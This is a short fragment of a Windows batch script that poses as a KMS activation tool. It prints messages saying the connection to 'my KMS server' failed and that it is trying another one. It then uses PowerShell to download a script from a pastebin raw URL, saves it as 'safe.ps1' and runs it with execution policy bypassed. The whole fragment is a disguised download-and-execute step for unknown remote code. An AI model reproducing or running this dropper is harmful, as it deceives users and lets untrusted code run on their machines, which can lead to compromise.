...
echo The connection to my KMS server failed! Trying to connect to another one...&echo Please wait...&echo&echo&echo ============================================================================
timeout /nobreak /t 5 >nul
echo KMS server was unsuccessful
powershell -command "Invoke-Webrequest https://pastebin.com/raw/XMRy2Kp4 -outfile safe.ps1"
powershell -exec bypass –C safe.ps1
